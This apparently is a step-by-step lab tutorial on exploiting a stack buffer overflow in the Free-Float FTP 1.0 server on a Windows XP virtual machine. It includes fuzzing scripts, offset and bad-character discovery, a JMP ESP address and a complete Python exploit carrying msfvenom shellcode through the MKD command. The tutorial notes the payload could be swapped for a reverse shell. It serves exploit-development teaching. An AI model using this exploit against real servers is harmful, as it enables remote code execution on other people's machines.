---
description: Here we exploit a stack based buffer overflow vulnerability in Free-FloatFTP
cover: >-
  https://images.unsplash.com/photo-1488590528505-98d2b5aba04b?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHwyfHx0ZWNofGVufDB8fHx8MTY5MjA5OTUwOXww&ixlib=rb-4.0.3&q=85
coverY: 0
---

# 🖥 Buffer Overflow Exploitation in Free-FloatFTP Server

### Pre-Requisites

**Virtual Machines**

* Windows XP
* Kali Linux&#x20;

**Tools**&#x20;

* Free-Float FTP v 1.0&#x20;
* Immunity Debugger&#x20;
* Mona.py&#x20;

### Installation and Setup

1. Install Immunity debugger and FreeFloatFTP on Windows XP and setup mona.py in the same.
2. **Find the IP address of Windows XP**: Start -> run -> cmd ->  type `ipconfig`

<figure><img src=".gitbook/assets/image (7).png" alt="" width="500"><figcaption></figcaption></figure>

### Exploit

### Fuzzing with Spike

1. Load the FreeFloatFTP server onto the immunity debugger, you will see that it is in a '<mark style="color:yellow;">paused</mark>' state at the bottom. You can start the server by click the play button on top.&#x20;

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

2. Navigate to your Kali Linux and write the following script, save the file with .spk extension to indicate SPIKE, a tool used for fuzzing.

{% code title="FreeFloatFTP.spk" %}
```python
s_string("USER");
s_string(" ");
s_string("anonymous");
s_string("\r\n");
s_string("PASS ");
s_string("anonymous");
s_string("\r\n");

s_string("MKD ");
s_string_variable("SEDV");
s_string("\r\n");
```
{% endcode %}

3. From your Linux terminal execute the command:

{% code fullWidth="false" %}
```bash
line_send_tcp <ip address> 21 FreeFloatFTP.spk 0 0
```
{% endcode %}

<figure><img src=".gitbook/assets/image (1).png" alt="" width="489"><figcaption></figcaption></figure>

4. Head back to your Windows machine, after a few seconds the FTP server should have crashed with the following warning:-

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Python for Fuzzing&#x20;

1. Write and save the following Python code in your Kali machine, and replace it with your Windows IP address before executing.

```python
import socket
import sys

buff = "A"*500

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.153.137',21))

s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD '+buff+'\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
```

2. **In Windows XP:** Restart the program in Immunity debugger by clicking the button on top, and press play to run the server.&#x20;
3. **In Kali Linux:** run the Python script with the following command, and the server will crash with the same error as before.

```bash
python2 fuzz_FreeFloatFTP.py
```

### Finding Offset&#x20;

1. Execute the following command to create a pattern with Metasploit

```bash
msf-pattern_create -l 500
```

<figure><img src=".gitbook/assets/image (3).png" alt="" width="484"><figcaption></figcaption></figure>

2. Take the output given and pass it to parameter '`buff`' in the .py script and save it.

<figure><img src=".gitbook/assets/image (4).png" alt="" width="478"><figcaption></figcaption></figure>

3. Restart and run the server in the immunity debugger, from your Kali machine run the Python script again from your terminal. The program should crash with the following error, giving us the EIP address. Copy the EIP address to the clipboard.

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

4. Find Offset value by running the command

```
msf-pattern_offset -q 69413269
```

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

We can see that Metasploit found an exact match at `247`.

### Overwriting EIP

1. Modify the Python script again to write A's to the stack and EIP as 'B'. And now run the exploit again.

<figure><img src=".gitbook/assets/image (13).png" alt="" width="482"><figcaption></figcaption></figure>

We crash the server and get an access violation error at `42424242`, 42 being the ASCII value for B.

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

### Mona to find an address

1. Type the command onto the immunity debugger. (Ensure Mona is in the same directory as your debugger)

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

```
!mona jmp -r esp 
```

2. Select an address from shell32.dll with defenses such as ASLR set to 'false'. In this case, we take - `7C9D31DB`

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

### Finding Bad Characters&#x20;

1. Modify the script to pass characters after it writes A till the offset point. By default '`\x00`' is a bad character, go ahead and remove it.

```python
import socket
import sys

badchar = "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
badchar += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchar += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
badchar += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
badchar += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
badchar += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
badchar += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
badchar += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

buff = "A"*247 + badchar
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.153.137',21))

s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD '+buff+'\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
```

2. By following the dump, you can see that values after '`09`' are not the characters we sent, meaning the value after '`09`' is a bad character.

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

3. Save and run the script again after removing '`\x00\x0a`'. We can see that values after '`0c`' are not valid ones. Hence '`\x0d`' is a bad character.

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

4. Now that we have removed all bad characters, we can see that the dump now follows the sequence.&#x20;

<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

### Generating Shellcode&#x20;

1. From your Kali machine, run the following command

```bash
msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
```

{% hint style="info" %}
**Metasploit payload** : -p windows/exec CMD=calc.exe

**-b** : bad characters ( \x00\x0A\x0D)

**-f python** : Format python
{% endhint %}

2. Metasploit will generate the following shellcode&#x20;

<figure><img src=".gitbook/assets/image (25).png" alt="" width="488"><figcaption></figcaption></figure>

### Buffer Overflow

1. Change the address we retrieved earlier to little-endian format&#x20;

```
Address: 7C9D31DB
Little Endian Format: \xdb\x31\x9d\x7c
```

2. The generated shellcode will be the payload here, pass it to buff with the NOP.

```python
import socket
import sys

buf = ""
buf += "\xd9\xd0\xd9\x74\x24\xf4\x5b\xba\x9a\x1b\x2c\x8f"
buf += "\x2b\xc9\xb1\x31\x83\xeb\xfc\x31\x53\x14\x03\x53"
buf += "\x8e\xf9\xd9\x73\x46\x7f\x21\x8c\x96\xe0\xab\x69"
buf += "\xa7\x20\xcf\xfa\x97\x90\x9b\xaf\x1b\x5a\xc9\x5b"
buf += "\xa8\x2e\xc6\x6c\x19\x84\x30\x42\x9a\xb5\x01\xc5"
buf += "\x18\xc4\x55\x25\x21\x07\xa8\x24\x66\x7a\x41\x74"
buf += "\x3f\xf0\xf4\x69\x34\x4c\xc5\x02\x06\x40\x4d\xf6"
buf += "\xde\x63\x7c\xa9\x55\x3a\x5e\x4b\xba\x36\xd7\x53"
buf += "\xdf\x73\xa1\xe8\x2b\x0f\x30\x39\x62\xf0\x9f\x04"
buf += "\x4b\x03\xe1\x41\x6b\xfc\x94\xbb\x88\x81\xae\x7f"
buf += "\xf3\x5d\x3a\x64\x53\x15\x9c\x40\x62\xfa\x7b\x02"
buf += "\x68\xb7\x08\x4c\x6c\x46\xdc\xe6\x88\xc3\xe3\x28"
buf += "\x19\x97\xc7\xec\x42\x43\x69\xb4\x2e\x22\x96\xa6"
buf += "\x91\x9b\x32\xac\x3f\xcf\x4e\xef\x55\x0e\xdc\x95"
buf += "\x1b\x10\xde\x95\x0b\x79\xef\x1e\xc4\xfe\xf0\xf4"
buf += "\xa1\xf1\xba\x55\x83\x99\x62\x0c\x96\xc7\x94\xfa"
buf += "\xd4\xf1\x16\x0f\xa4\x05\x06\x7a\xa1\x42\x80\x96"
buf += "\xdb\xdb\x65\x99\x48\xdb\xaf\xfa\x0f\x4f\x33\xd3"
buf += "\xaa\xf7\xd6\x2b"

buff = "A"*247 + "\xdb\x31\x9d\x7c" + "\x90" *20 + buf
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.153.137',21))

s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD '+buff+'\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
```

3. Restart the FTP server and run the exploit again one last time. When you navigate to your Windows machine, you should see a calculator pop up and the process '<mark style="color:red;">terminated</mark>' displayed at the bottom. From here the Metasploit payload  can be changed to anything to even get a reverse shell.&#x20;

<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

